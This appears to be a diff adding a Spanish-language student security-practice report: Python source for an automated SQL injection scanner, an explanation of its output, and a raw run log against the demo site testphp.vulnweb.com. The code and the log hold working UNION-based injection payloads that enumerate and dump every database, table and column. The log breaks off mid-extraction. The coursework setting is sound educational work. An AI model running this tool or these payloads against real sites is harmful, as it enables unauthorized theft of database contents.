+    <span class="hljs-comment">#Verifico y si el html tiene uno de los errores</span>
+    errorsMySQL = { <span class="hljs-string">&quot;warning: mysql&quot;</span>, <span class="hljs-string">&quot;you have an error in your sql syntax&quot;</span>, <span class="hljs-string">&quot;error executing query&quot;</span> }
+
+    <span class="hljs-keyword">for</span> error <span class="hljs-keyword">in</span> errorsMySQL:
+        
+        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> response:
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scanGETSQLI</span>(<span class="hljs-params">url</span>):</span>
+    <span class="hljs-comment">#Funcion para poner a prueba el metodo GET poniendo comillas en cada parametro y probando</span>
+    print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Probando SQLI en url&quot;</span>)
+
+    vulv_parameters = []
+    parse = urlparse(url)
+    parameters = parse.query.split(<span class="hljs-string">&#x27;&amp;&#x27;</span>)
+    
+    <span class="hljs-keyword">if</span> parameters[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;&quot;</span>:
+        <span class="hljs-keyword">return</span> []
+
+    <span class="hljs-keyword">for</span> parameter <span class="hljs-keyword">in</span> parameters:
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;\&quot;&#x27;&quot;</span>:   
+            new_url = url.replace(parameter, parameter + c)
+            res = s.get(new_url).content.decode().lower()
+            print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Probando&quot;</span>, new_url)
+
+            <span class="hljs-keyword">if</span> vulnerable(res):
+                print(bcolors.OKGREEN + <span class="hljs-string">&quot;[+] Vulnerable el parametro &quot;</span> + parameter.split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">0</span>])
+                vulv_parameters.append(parameter.split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">0</span>] + c)
+    <span class="hljs-keyword">return</span> vulv_parameters
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scanPOSTSQLI</span>(<span class="hljs-params">url</span>):</span>
+
+    print(bcolors.WARNING + <span class="hljs-string">&quot;\n[!] Probando SQLI en forms&quot;</span>)
+    
+    forms = getFormsURL(url)
+    
+    <span class="hljs-keyword">if</span> len(forms) &gt; <span class="hljs-number">0</span>:
+
+        print(bcolors.OKGREEN + <span class="hljs-string">&quot;[+] Encontrados&quot;</span>, len(forms), <span class="hljs-string">&quot;formularios en la pagina.&quot;</span>)
+        
+        <span class="hljs-keyword">for</span> form <span class="hljs-keyword">in</span> forms:
+
+            info_form = getInfoForm(form)
+
+            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;\&quot;&#x27;&quot;</span>:
+                
+                <span class="hljs-comment">#Datos que vamos a enviar</span>
+                datos = {}
+
+                <span class="hljs-keyword">for</span> input_tag <span class="hljs-keyword">in</span> info_form[<span class="hljs-string">&#x27;inputs&#x27;</span>]:
+                    
+                    <span class="hljs-comment">#Si el input esta oculto o tiene valor</span>
+                    <span class="hljs-keyword">if</span> input_tag[<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-keyword">or</span> input_tag[<span class="hljs-string">&quot;value&quot;</span>]:
+                        <span class="hljs-keyword">try</span>:
+                            datos[input_tag[<span class="hljs-string">&quot;name&quot;</span>]] = input_tag[<span class="hljs-string">&quot;value&quot;</span>] + c
+                        <span class="hljs-keyword">except</span>:
+                            <span class="hljs-keyword">pass</span>
+                    
+                    <span class="hljs-comment">#A todos los demas se añade algo con comillas</span>
+                    <span class="hljs-keyword">elif</span> input_tag[<span class="hljs-string">&quot;type&quot;</span>] != <span class="hljs-string">&quot;submit&quot;</span>:
+                        datos[input_tag[<span class="hljs-string">&quot;name&quot;</span>]] = <span class="hljs-string">&quot;var&quot;</span> + c
+                
+                url = urljoin(url, info_form[<span class="hljs-string">&quot;action&quot;</span>])
+            
+                res = <span class="hljs-string">&quot;&quot;</span>
+                
+                <span class="hljs-keyword">if</span> info_form[<span class="hljs-string">&quot;method&quot;</span>] == <span class="hljs-string">&quot;post&quot;</span>:
+                    res = s.post(url, data=datos).content.decode().lower()
+                <span class="hljs-keyword">elif</span> info_form[<span class="hljs-string">&quot;method&quot;</span>] == <span class="hljs-string">&quot;get&quot;</span>:
+                    res = s.get(url, params=datos).content.decode().lower()
+                
+
+                <span class="hljs-keyword">if</span> vulnerable(res):
+                    print(bcolors.OKGREEN + <span class="hljs-string">&quot;\n[+] Vulnerabilidad detectada en el form:\n&quot;</span>)
+                    pp = pprint.PrettyPrinter()
+                    pp.pprint(info_form)
+                    <span class="hljs-keyword">break</span>
+
+    <span class="hljs-keyword">else</span>:
+
+        print(bcolors.FAIL + <span class="hljs-string">&quot;\n\t[-] No se han encontrado formularios en la pagina.&quot;</span>)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getFormsURL</span>(<span class="hljs-params">url</span>):</span>
+    <span class="hljs-comment">#Busca y recopila todos los forms</span>
+    print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Buscando formularios.&quot;</span>)
+    soup = bs(s.get(url).content, <span class="hljs-string">&quot;html.parser&quot;</span>)
+    <span class="hljs-keyword">return</span> soup.find_all(<span class="hljs-string">&quot;form&quot;</span>)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getInfoForm</span>(<span class="hljs-params">form</span>):</span>
+    <span class="hljs-comment">#Analiza el form introducido para sacar la informacion</span>
+
+    <span class="hljs-comment">#Form action</span>
+
+    <span class="hljs-keyword">try</span>:
+        action = form.attrs.get(<span class="hljs-string">&quot;action&quot;</span>).lower()
+    <span class="hljs-keyword">except</span>:
+        action = <span class="hljs-literal">None</span>
+    
+    <span class="hljs-comment">#Form method</span>
+
+    method = form.attrs.get(<span class="hljs-string">&quot;method&quot;</span>, <span class="hljs-string">&quot;get&quot;</span>).lower()
+
+    <span class="hljs-comment">#Informacion de los inputs</span>
+
+    inputs = []
+
+    <span class="hljs-keyword">for</span> input_tag <span class="hljs-keyword">in</span> form.find_all(<span class="hljs-string">&quot;input&quot;</span>):
+
+        input_name = input_tag.attrs.get(<span class="hljs-string">&quot;name&quot;</span>)
+        input_type = input_tag.attrs.get(<span class="hljs-string">&quot;type&quot;</span>,<span class="hljs-string">&quot;text&quot;</span>)
+        input_value = input_tag.attrs.get(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)
+
+        inputs.append({<span class="hljs-string">&quot;name&quot;</span>:input_name, <span class="hljs-string">&quot;type&quot;</span>:input_type, <span class="hljs-string">&quot;value&quot;</span>:input_value})
+
+    info = {
+
+            <span class="hljs-string">&quot;action&quot;</span>:action,
+            <span class="hljs-string">&quot;method&quot;</span>:method,
+            <span class="hljs-string">&quot;inputs&quot;</span>:inputs
+    }
+
+    <span class="hljs-keyword">return</span> info
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recopilarInfoURL</span>(<span class="hljs-params">vulv_url, url</span>):</span>
+    print(bcolors.WARNING + <span class="hljs-string">&quot;\n[!] Sacando informacion&quot;</span>)
+    <span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> vulv_url:
+        c = param[<span class="hljs-number">-1</span>]
+        <span class="hljs-comment"># Ahora toca ver de que tipoc es el parametro</span>
+        <span class="hljs-comment"># Primero probamos con un payload de tipo int</span>
+        print(url, param[<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>])
+        payload = url.replace(param[<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>] + <span class="hljs-string">&quot;=&quot;</span>, param[<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>]+<span class="hljs-string">&quot;=1 order by 1000 -- -&quot;</span>)
+        res = s.get(payload).content.decode().lower()
+        print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Ejecutando payload:&quot;</span>, payload)
+        
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;unknown column&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res:
+            <span class="hljs-comment"># Ahora probamos con un String con comillas dobles</span>
+            payload = url.replace(param[<span class="hljs-number">0</span>:<span class="hljs-number">-2</span>], param[<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>]+<span class="hljs-string">&#x27;=1&quot; order by 1000 -- -&#x27;</span>)
+            res = s.get(payload).content.decode().lower()
+            print(<span class="hljs-string">&quot;[!] Ejecutando payload:&quot;</span>, payload)
+
+            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;unknown columm&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res:
+                <span class="hljs-comment"># Por ultimo probamos comillas simples</span>
+                payload = url.replace(param[<span class="hljs-number">0</span>:<span class="hljs-number">-2</span>], param[<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>]+<span class="hljs-string">&quot;=1&#x27; order by 1000 -- -&quot;</span>)
+                res = s.get(payload).content.decode().lower()
+                print(<span class="hljs-string">&quot;[!] Ejecutando payload:&quot;</span>, payload)
+
+                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;unknown column&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res:
+                    print(bcolors.FAIL + <span class="hljs-string">&quot;[-] No ha funcionado nunguna prueba&quot;</span>)
+                    <span class="hljs-keyword">continue</span>
+                <span class="hljs-keyword">else</span>:
+                    tipo = <span class="hljs-string">&quot;str&#x27;&quot;</span>
+            <span class="hljs-keyword">else</span>:
+                tipo = <span class="hljs-string">&#x27;str&quot;&#x27;</span>
+        <span class="hljs-keyword">else</span>:
+            tipo = <span class="hljs-string">&quot;int&quot;</span>
+
+        print(bcolors.OKGREEN + <span class="hljs-string">&quot;[+] Pruebas con exito en el parametro&quot;</span>, param[<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>], <span class="hljs-string">&quot;con el tipo&quot;</span>, tipo)
+            
+        <span class="hljs-comment"># Ahora saco cuantos parametros tiene la consulta</span>
+        
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">101</span>):
+            payloadInfo = payload.replace(<span class="hljs-string">&quot;order by 1000&quot;</span>, <span class="hljs-string">&quot;order by &quot;</span> + str(i))
+            print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Utilizando payload: &quot;</span> + payloadInfo)
+            res = s.get(payloadInfo).content.decode().lower()
+
+            <span class="hljs-keyword">if</span> vulnerable(res):
+                print(bcolors.OKGREEN + <span class="hljs-string">&quot;[+] Encontrado numero de parametros:&quot;</span>, i<span class="hljs-number">-1</span>)
+                n_parametros = i<span class="hljs-number">-1</span>
+                <span class="hljs-keyword">break</span>
+        
+        <span class="hljs-comment">#Una vez tengo el numero de parametro busco uno que se refleje en la pagina</span>
+        print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Buscando parametros que se reflejen&quot;</span>)
+        parameters = <span class="hljs-string">&quot;&quot;</span>
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,n_parametros):
+            <span class="hljs-keyword">if</span> i == n_parametros<span class="hljs-number">-1</span>:
+                parameters = parameters + <span class="hljs-string">&#x27;&quot;parametro&#x27;</span> + str(i) + <span class="hljs-string">&#x27;&quot;&#x27;</span>
+            <span class="hljs-keyword">else</span>:
+                parameters = parameters + <span class="hljs-string">&#x27;&quot;parametro&#x27;</span> + str(i) + <span class="hljs-string">&#x27;&quot;,&#x27;</span>
+        payload = payload.replace(<span class="hljs-string">&quot;order by 1000&quot;</span>, <span class="hljs-string">&quot;and 1=0 union select &quot;</span> + parameters)
+        
+        print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Utilizando payload: &quot;</span> + payload)
+        
+        res = s.get(payload).content.decode().lower()
+        
+        index_parametro = <span class="hljs-number">-1</span>
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,n_parametros):
+            keyword = <span class="hljs-string">&#x27;&gt;parametro&#x27;</span> + str(i)
+            <span class="hljs-keyword">if</span> keyword <span class="hljs-keyword">in</span> res:
+                print(bcolors.OKGREEN + <span class="hljs-string">&quot;[+] El parametro con el indice&quot;</span>, i, <span class="hljs-string">&quot;se refleja&quot;</span>)
+                index_parametro = i
+                <span class="hljs-keyword">break</span>
+        <span class="hljs-keyword">if</span> index_parametro == <span class="hljs-number">-1</span>:
+            print(bcolors.FAIL + <span class="hljs-string">&quot;[-] No se ha encontrado ningun parametro que se refleje&quot;</span>)
+            <span class="hljs-keyword">break</span>
+        
+        <span class="hljs-comment">#Una vez se el numero de parametro y el indice de uno que se refleje ya puedo sacar toda la informacion que quiera</span>
+        print(bcolors.WARNING + <span class="hljs-string">&quot;\n[!] Sacando informacion de la base de datos&quot;</span>)
+
+        informacionTotal = {}
+
+        <span class="hljs-comment"># Primero saco las bases de datos que hay</span>
+        keyword = <span class="hljs-string">&#x27;&quot;parametro&#x27;</span> + str(index_parametro) + <span class="hljs-string">&#x27;&quot;&#x27;</span>
+        payloadInfo = payload.replace(keyword, <span class="hljs-string">&#x27;group_concat(&quot;&lt;SQLI&gt;&quot;,schema_name,&quot;&lt;/SQLI&gt;&quot;)&#x27;</span>)
+        payloadInfo = payloadInfo.replace(<span class="hljs-string">&quot;-- -&quot;</span>, <span class="hljs-string">&quot;from information_schema.schemata -- -&quot;</span>)
+        print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Utilizando payload:&quot;</span>, payloadInfo)
+        
+        soup = bs(s.get(payloadInfo).content, <span class="hljs-string">&quot;html.parser&quot;</span>)
+        
+        <span class="hljs-comment">#Limpio la salida</span>
+        soup = soup.find_all(<span class="hljs-string">&#x27;sqli&#x27;</span>)
+        databases = []
+        <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> soup:
+            databases.append(w.text)
+        
+        <span class="hljs-keyword">if</span> len(databases) == <span class="hljs-number">0</span>:
+            print(bcolors.FAIL + <span class="hljs-string">&quot;[-] Ha ocurrido un error sacando las bases de datos&quot;</span>)
+            <span class="hljs-keyword">return</span>
+
+        print(bcolors.OKGREEN + <span class="hljs-string">&quot;[+] Se han encontrado&quot;</span>, len(databases), <span class="hljs-string">&quot;bases de datos:&quot;</span>, databases)
+        
+        <span class="hljs-comment"># Ahora saco las tablas de cada base de datos</span>
+        <span class="hljs-keyword">for</span> database <span class="hljs-keyword">in</span> databases:
+            <span class="hljs-keyword">if</span> database != <span class="hljs-string">&quot;information_schema&quot;</span>:
+                payload = payloadInfo.replace(<span class="hljs-string">&quot;schema_name&quot;</span>, <span class="hljs-string">&quot;table_name&quot;</span>)
+                print(bcolors.WARNING + <span class="hljs-string">&quot;\n[!] Buscando el nombre de las tablas de &quot;</span> + database)
+                payload = payload.replace(<span class="hljs-string">&quot;schemata&quot;</span>, <span class="hljs-string">&quot;tables where table_schema=&#x27;&quot;</span>+database+<span class="hljs-string">&quot;&#x27;&quot;</span>)
+                print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Utilizando el payload: &quot;</span> + payload )
+
+                soup = bs(s.get(payload).content, <span class="hljs-string">&quot;html.parser&quot;</span>)
+                soup = soup.find_all(<span class="hljs-string">&#x27;sqli&#x27;</span>)
+                table_names = []
+                <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> soup:
+                    table_names.append(w.text)
+                print(bcolors.OKGREEN + <span class="hljs-string">&quot;[+] Se han encontrado&quot;</span>, len(table_names), <span class="hljs-string">&quot;tablas:&quot;</span>, table_names)
+                
+                <span class="hljs-comment"># Creo la informacion</span>
+                informacionTotal[database] = {}
+                
+                <span class="hljs-comment"># Ahora saco las columnas de cada tabla</span>
+                
+                <span class="hljs-keyword">for</span> tabla <span class="hljs-keyword">in</span> table_names:
+                    print(bcolors.WARNING + <span class="hljs-string">&quot;\n[!] Buscando las columnas de la tabla &quot;</span> + tabla)
+                    payload = payloadInfo.replace(<span class="hljs-string">&quot;schema_name&quot;</span>, <span class="hljs-string">&quot;column_name&quot;</span>)
+                    payload = payload.replace(<span class="hljs-string">&quot;schemata&quot;</span>, <span class="hljs-string">&quot;columns where table_name=&#x27;&quot;</span> + tabla + <span class="hljs-string">&quot;&#x27;&quot;</span>)
+                    print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Utilizando el payload: &quot;</span> + payload)
+
+                    soup = bs(s.get(payload).content, <span class="hljs-string">&quot;html.parser&quot;</span>)
+                    soup = soup.find_all(<span class="hljs-string">&#x27;sqli&#x27;</span>)
+                    columns = []
+                    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> soup:
+                        columns.append(w.text)
+                    print(bcolors.OKGREEN + <span class="hljs-string">&quot;[+] Se han encontrado&quot;</span>, len(columns) , <span class="hljs-string">&quot;columnas:&quot;</span>, columns)
+                    
+                    <span class="hljs-comment">#Creo la informacion</span>
+                    informacionTotal[database][tabla] = {}
+
+                    <span class="hljs-comment"># Ahora saco los datos de cada columna</span>
+                    
+                    <span class="hljs-keyword">for</span> column <span class="hljs-keyword">in</span> columns:
+                        print(bcolors.WARNING + <span class="hljs-string">&quot;\n[!] Buscando los datos de la columna &quot;</span> + column)
+                        payload = payloadInfo.replace(<span class="hljs-string">&quot;schema_name&quot;</span>, column)
+                        payload = payload.replace(<span class="hljs-string">&quot;information_schema.schemata&quot;</span>, database + <span class="hljs-string">&quot;.&quot;</span> + tabla)
+                        print(bcolors.WARNING + <span class="hljs-string">&quot;\n[!] Utilizando el payload: &quot;</span> + payload)
+
+                        soup = bs(s.get(payload).content, <span class="hljs-string">&quot;html.parser&quot;</span>)
+                        soup = soup.find_all(<span class="hljs-string">&#x27;sqli&#x27;</span>)
+                        data = []
+                        
+                        <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> soup:
+                            data.append(w.text)
+                        print(bcolors.OKGREEN + <span class="hljs-string">&quot;[+] Se han encontrado&quot;</span>, len(data), <span class="hljs-string">&quot;datos: &quot;</span>, data)
+                                
+                        <span class="hljs-comment"># Fusiono toda la informacion</span>
+                        informacionTotal[database][tabla][column] = data
+
+        <span class="hljs-keyword">return</span> informacionTotal        
+        
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">menu</span>(<span class="hljs-params">info</span>):</span>
+    print(bcolors.OKGREEN + <span class="hljs-string">&quot;[+] Terminado el proceso de analisis de la pagina\n\n&quot;</span> + bcolors.ENDC)
+    
+    database = <span class="hljs-string">&quot;&quot;</span>
+    
+    <span class="hljs-keyword">exec</span> = <span class="hljs-literal">True</span>
+
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">exec</span>:
+
+        <span class="hljs-keyword">if</span> database == <span class="hljs-string">&quot;&quot;</span>:
+            print(<span class="hljs-string">&quot;\nSelecciona una opcion:\n&quot;</span>)
+            print(<span class="hljs-string">&quot;\t1. Seleccionar base de datos&quot;</span>)
+            print(<span class="hljs-string">&quot;\t2. Ver base de datos&quot;</span>)
+            print(<span class="hljs-string">&quot;\t3. Salir\n&quot;</span>)
+
+            op = int(input(<span class="hljs-string">&quot;-&gt; &quot;</span>))
+            
+            <span class="hljs-keyword">if</span> op == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> op == <span class="hljs-number">2</span>:
+                comprobar=<span class="hljs-literal">True</span>
+                <span class="hljs-keyword">while</span> comprobar:
+                    print(<span class="hljs-string">&quot;\nSelecciona una de las siguientes bases de datos:&quot;</span>,end=<span class="hljs-string">&#x27; &#x27;</span>)
+                    <span class="hljs-keyword">for</span> db <span class="hljs-keyword">in</span> info:
+                        print(db, end=<span class="hljs-string">&#x27; &#x27;</span>)
+                    
+                    txt_input = input(<span class="hljs-string">&quot;\n\n-&gt; &quot;</span>)
+                    
+                    <span class="hljs-keyword">if</span> txt_input <span class="hljs-keyword">in</span> info:
+                        comprobar = <span class="hljs-literal">False</span>
+                
+                <span class="hljs-keyword">if</span> op == <span class="hljs-number">1</span>:
+                    database = txt_input
+                <span class="hljs-keyword">else</span>:
+                    t = PrettyTable([txt_input])
+                    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> info[txt_input]:
+                        t.add_row([w])
+                    print(<span class="hljs-string">&quot;\n&quot;</span>, t)
+
+            <span class="hljs-keyword">elif</span> op == <span class="hljs-number">3</span>:
+                <span class="hljs-keyword">exec</span> = <span class="hljs-literal">False</span>
+
+        <span class="hljs-keyword">else</span>:
+            print(<span class="hljs-string">&quot;\nSelecciona una opcion:\n&quot;</span>)
+            print(<span class="hljs-string">&quot;\t1. Ver tabla&quot;</span>)
+            print(<span class="hljs-string">&quot;\t2. Volver a seleccion de base de datos&quot;</span>)
+            print(<span class="hljs-string">&quot;\t3. Salir\n&quot;</span>)
+            
+            op = int(input(<span class="hljs-string">&quot;[&quot;</span> + database + <span class="hljs-string">&quot;] -&gt; &quot;</span>))
+
+            <span class="hljs-keyword">if</span> op == <span class="hljs-number">1</span>:
+                comprobar=<span class="hljs-literal">True</span>
+                <span class="hljs-keyword">while</span> comprobar:
+                    print(<span class="hljs-string">&quot;\nSelecciona una de las siguientes tablas:&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)
+                    <span class="hljs-keyword">for</span> tb <span class="hljs-keyword">in</span> info[database]:
+                        print(tb, end=<span class="hljs-string">&#x27; &#x27;</span>)
+
+                    txt_input = input(<span class="hljs-string">&quot;\n\n[&quot;</span> + database + <span class="hljs-string">&quot;] -&gt; &quot;</span>)
+
+                    <span class="hljs-keyword">if</span> txt_input <span class="hljs-keyword">in</span> info[database]:
+                        comprobar = <span class="hljs-literal">False</span>
+                
+                <span class="hljs-comment">#Imprimo la tabla</span>
+                t = PrettyTable()
+                <span class="hljs-keyword">for</span> column <span class="hljs-keyword">in</span> info[database][txt_input]:
+                    t.add_column(column, info[database][txt_input][column])
+                print(t)
+
+            <span class="hljs-keyword">elif</span> op == <span class="hljs-number">2</span>:
+                database = <span class="hljs-string">&quot;&quot;</span>
+
+            <span class="hljs-keyword">elif</span> op == <span class="hljs-number">3</span>:
+                <span class="hljs-keyword">exec</span> = <span class="hljs-literal">False</span>
+                        
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    
+    url = sys.argv[<span class="hljs-number">1</span>]
+
+    <span class="hljs-keyword">if</span> comprobarURL(url):
+    
+        banner()
+
+        print(bcolors.WARNING + <span class="hljs-string">&quot;[!] Utilizando la url: &quot;</span> + url + <span class="hljs-string">&quot;\n&quot;</span>)
+        
+        vulv_url = scanGETSQLI(url)
+        
+        vulv_form = scanPOSTSQLI(url)
+        
+        informacionTotal = {}
+
+        <span class="hljs-keyword">if</span> len(vulv_url) &gt; <span class="hljs-number">0</span>:
+            informacionTotal = recopilarInfoURL(vulv_url, url)
+
+        <span class="hljs-comment"># No está hecha la parte de vulnerar por Post</span>
+        <span class="hljs-comment">#if len(vulv_form) &gt; 0 and len(informacionTotal)==0:</span>
+        <span class="hljs-comment">#    recopilarInfoForm(vulv_form, url)</span>
+
+        <span class="hljs-keyword">if</span> len(informacionTotal)&gt;<span class="hljs-number">0</span>:
+            menu(informacionTotal)
+        <span class="hljs-keyword">else</span>:
+            print(bcolors.FAIL + <span class="hljs-string">&quot;\n[-] No se ha encontrado ningun tipo de informacion&quot;</span>)
+
+    <span class="hljs-keyword">else</span>:
+
+        print(bcolors.FAIL + <span class="hljs-string">&quot;\n[-] No has introducido bien la url, añade http:// o https://&quot;</span>)
+</div></code></pre>
+<h2 id="output-explicado">Output explicado</h2>
+<p>Al principio del programa se muestra un banner con el nombre y el creador (yo).</p>
+<p><img src="file:///c:\Users\MainDavis\Desktop\GitHub\Ciber\Practica 6\ej1\banner.png" alt="img"></p>
+<p>Acto seguido empezará a buscar las vulnerabilidades por parámetro y por los forms de la página.</p>
+<p><img src="file:///c:\Users\MainDavis\Desktop\GitHub\Ciber\Practica 6\ej1\scann.png" alt="img"></p>
+<p>Depues buscará en los parámetro de la url su tipo y la cantidad de parámetros de la busqueda, junto a un parámetro que se refleje en la página.</p>
+<p><img src="file:///c:\Users\MainDavis\Desktop\GitHub\Ciber\Practica 6\ej1\parametros.png" alt="img"></p>
+<p>Una vez terminado sacará toda la información de las bases de datos que se encuentren en la página.</p>
+<p><img src="file:///c:\Users\MainDavis\Desktop\GitHub\Ciber\Practica 6\ej1\busqueda.png" alt="img"></p>
+<p>Cuando termine de recopilar toda la información, se mostrará un menu en el que podrás seleccionar una de las bases de datos detectadas e imprimir el contenido de sus tablas.</p>
+<p><img src="file:///c:\Users\MainDavis\Desktop\GitHub\Ciber\Practica 6\ej1\menu.png" alt="img"></p>
+<h2 id="output-raw">Output RAW</h2>
+<pre><code class="language-text"><div>
+❯ python3 scanner.py &quot;http://testphp.vulnweb.com/listproducts.php?cat=17&amp;prueba=5&quot;
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+  ▄████████ ████████▄    ▄█        ▄█          ▄████████  ▄████████    ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████    ▄████████  
+  ███    ███ ███    ███  ███       ███         ███    ███ ███    ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███   ███    ███
+  ███    █▀  ███    ███  ███       ███▌        ███    █▀  ███    █▀    ███    ███ ███   ███ ███   ███   ███    █▀    ███    ███
+  ███        ███    ███  ███       ███▌        ███        ███          ███    ███ ███   ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀
+▀███████████ ███    ███  ███       ███▌      ▀███████████ ███        ▀███████████ ███   ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
+         ███ ███    ███  ███       ███                ███ ███    █▄    ███    ███ ███   ███ ███   ███   ███    █▄  ▀███████████
+   ▄█    ███ ███  ▀ ███  ███▌    ▄ ███          ▄█    ███ ███    ███   ███    ███ ███   ███ ███   ███   ███    ███   ███    ███
+ ▄████████▀   ▀██████▀▄█ █████▄▄██ █▀         ▄████████▀  ████████▀    ███    █▀   ▀█   █▀   ▀█   █▀    ██████████   ███    ███
+                         ▀                                                                                           ███    ███
+
+----------------------------------------------------- By MainDavis -------------------------------------------------------------
+
+
+[!] Utilizando la url: http://testphp.vulnweb.com/listproducts.php?cat=17&amp;prueba=5
+
+[!] Probando http://testphp.vulnweb.com/listproducts.php?cat=17&quot;&amp;prueba=5
+[+] Vulnerable el parametro cat
+[!] Probando http://testphp.vulnweb.com/listproducts.php?cat=17&#x27;&amp;prueba=5
+[+] Vulnerable el parametro cat
+[!] Probando http://testphp.vulnweb.com/listproducts.php?cat=17&amp;prueba=5&quot;
+[!] Probando http://testphp.vulnweb.com/listproducts.php?cat=17&amp;prueba=5&#x27;
+
+[!] Probando SQLI en forms
+[!] Buscando formularios.
+[+] Encontrados 1 formularios en la pagina.
+
+[!] Sacando informacion
+[!] Ejecutando payload: http://testphp.vulnweb.com/listproducts.php?cat=1 order by 1 -- -=17&amp;prueba=5
+[+] Pruebas con exito en el parametro cat con el tipo int
+[+] Encontrado numero de parametros: 11
+[!] Buscando parametros que se reflejen
+[!] Utilizando payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,&quot;parametro1&quot;,&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; -- -=17&amp;prueba=5
+[+] El parametro con el indice 1 se refleja
+
+[!] Sacando informacion de la base de datos
+[!] Utilizando payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,schema_name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from information_schema.schemata -- -=17&amp;prueba=5
+[+] Se han encontrado 2 bases de datos: [&#x27;information_schema&#x27;, &#x27;acuart&#x27;]
+
+[!] Buscando el nombre de las tablas de acuart
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,table_name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from information_schema.tables where table_schema=&#x27;acuart&#x27; -- -=17&amp;prueba=5
+[+] Se han encontrado 8 tablas: [&#x27;artists&#x27;, &#x27;carts&#x27;, &#x27;categ&#x27;, &#x27;featured&#x27;, &#x27;guestbook&#x27;, &#x27;pictures&#x27;, &#x27;products&#x27;, &#x27;users&#x27;]
+
+[!] Buscando las columnas de la tabla artists
